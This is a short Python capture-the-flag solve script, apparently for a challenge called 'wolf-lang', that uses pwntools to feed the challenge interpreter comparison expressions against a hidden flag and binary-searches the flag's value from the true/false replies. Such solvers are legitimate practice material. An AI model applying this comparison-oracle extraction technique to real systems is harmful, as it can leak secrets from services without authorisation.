from pwn import process, remote
from functools import partial

def from_int(i):
    h = hex(i)[2:]
    h = h if h[-1] != 'L' else h[:-1]
    h = h if len(h) % 2 == 0 else '0' + h
    return h.decode('hex')

def create_test(i):
  return "if " + str(i) + " > flag then true else false";

def parse_bool(x):
  return x.split(' : ')[0] == 'true'

def greater_than_tube(io_f, i):
  payload = create_test(i)
  io = io_f()
  io.send(payload)
  io.shutdown('out')
  x = io.recvall();
  io.close()
  return parse_bool(x)

def bounds(greater_than):
  guess = 1
  while not greater_than(guess):
    guess *= 2
  return guess // 2, guess

def binary_search(greater_than, lo, hi):
  mid = (lo + hi) // 2
  if (hi - lo) <= 1:
    return mid
  elif greater_than(mid):
    return binary_search(greater_than, lo, mid)
  else:
    return binary_search(greater_than, mid, hi) 

def main():
  l = lambda: process('wolf-lang')
  r = lambda: remote('wolf.chal.pwning.xxx', 6808)
  greater_than = partial(greater_than_tube, l)

  lo, hi = bounds(greater_than)

  print('flag is between', lo, 'and', hi)

  flag_int = binary_search(greater_than, lo, hi)

  print('flag is', from_int(flag_int))

main() 
